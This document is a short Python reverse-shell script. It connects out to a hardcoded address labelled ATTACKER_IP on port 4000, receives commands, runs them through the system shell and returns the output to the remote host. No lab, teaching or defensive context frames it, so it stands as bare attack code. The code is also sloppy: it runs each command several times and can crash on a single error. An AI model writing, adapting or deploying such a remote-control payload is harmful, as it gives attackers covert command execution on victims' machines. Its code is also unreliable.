import socket
import subprocess

#ATTACKER_IP = 192.168.0.132
################################################################
##PORT IS 4000

import os

...


def main():
    s = socket.socket()
    s.connect(('192.168.0.132', 4000))
        
    cmd = s.recv(1024).decode()
            
    while cmd != 'exit':
        if cmd.startswith("cd "):
            path = cmd[3:].strip()
            try:
                os.chdir(path)
                s.sendall(b"Directory changed.\n")
            except Exception as e:
                s.sendall(f"Error changing directory: {str(e)}\n".encode())
        else:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            s.sendall(output)
            subprocess.call(cmd, shell=True)
        
        s.send(('\n' + subprocess.check_output(cmd).decode()).encode())
        s.send('Command executed successfully'.encode())
        
        cmd = s.recv(1024).decode()

    

if __name__ == "__main__":
    main()
